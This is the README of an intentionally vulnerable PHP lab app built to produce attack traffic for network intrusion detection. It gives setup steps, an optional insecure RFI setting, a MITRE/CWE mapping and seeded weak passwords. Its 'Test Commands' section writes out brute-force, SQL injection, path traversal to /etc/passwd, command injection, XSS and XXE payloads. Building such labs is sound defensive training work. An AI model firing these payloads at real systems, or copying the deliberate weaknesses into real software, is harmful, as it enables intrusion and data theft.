# PacketFeeder Lab — Vulnerable Web App Setup

> **WARNING**: This application is intentionally vulnerable. Deploy ONLY in isolated lab environments. Never expose to the internet or production networks.

## Prerequisites

- Debian/Ubuntu with Apache2
- PHP 8.x with modules: `php-sqlite3`, `php-xml`
- Network monitored by Snort/Suricata/ClearNDR

## Install

```bash
apt update && apt install -y apache2 php php-sqlite3 php-xml libapache2-mod-php
```

## Deploy

```bash
# Copy app to web root
cp -r lab/debian-web /var/www/html/packetfeeder-lab

# Set permissions (Apache needs write access for SQLite DB)
chown -R www-data:www-data /var/www/html/packetfeeder-lab
chmod 755 /var/www/html/packetfeeder-lab
chmod 666 /var/www/html/packetfeeder-lab/packetfeeder_lab.db 2>/dev/null || true
```

## Enable RFI (optional)

Edit `/etc/php/8.*/apache2/php.ini`:

```ini
allow_url_include = On
```

Then restart Apache:

```bash
systemctl restart apache2
```

## Access

- URL: `http://<server-ip>/packetfeeder-lab/`
- Default login: `admin` / `admin123`

## Modules & MITRE Mapping

| Module | File | Technique | CWE |
|--------|------|-----------|-----|
| Brute Force Login | `index.php` | T1110 | CWE-307 |
| SQL Injection | `sqli.php` | T1190 | CWE-89 |
| Local File Inclusion | `lfi.php` | T1005 | CWE-98 |
| Remote File Inclusion | `rfi.php` | T1059.004 | CWE-98 |
| Command Injection | `cmdi.php` | T1059 | CWE-78 |
| XSS (Reflected + Stored) | `xss.php` | T1059.007 | CWE-79 |
| XXE Injection | `xxe.php` | T1059 | CWE-611 |

## Test Commands

```bash
# Brute force
hydra -l admin -P wordlist.txt http-post-form "/packetfeeder-lab/index.php:username=^USER^&password=^PASS^:Invalid"

# SQL Injection
curl 'http://TARGET/packetfeeder-lab/sqli.php?id=1%20UNION%20SELECT%201,username,password,role%20FROM%20users--' -b 'PHPSESSID=xxx'

# LFI
curl 'http://TARGET/packetfeeder-lab/lfi.php?file=../../../etc/passwd' -b 'PHPSESSID=xxx'

# Command Injection
curl 'http://TARGET/packetfeeder-lab/cmdi.php?ip=;id' -b 'PHPSESSID=xxx'

# XSS Reflected
curl 'http://TARGET/packetfeeder-lab/xss.php?q=<script>alert(1)</script>' -b 'PHPSESSID=xxx'

# XXE
curl -X POST -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>' -b 'PHPSESSID=xxx' http://TARGET/packetfeeder-lab/xxe.php
```

## User Accounts (seeded)

| Username | Password | Role |
|----------|----------|------|
| admin | admin123 | admin |
| operator | operator1 | operator |
| analyst | analyst2024 | analyst |
| guest | guest | guest |
| john | password | user |
| jane | letmein | user |
| bob | qwerty | user |
| alice | 123456 | user |
| ftpuser | ftp1234 | service |
| smbuser | smb1234 | service |
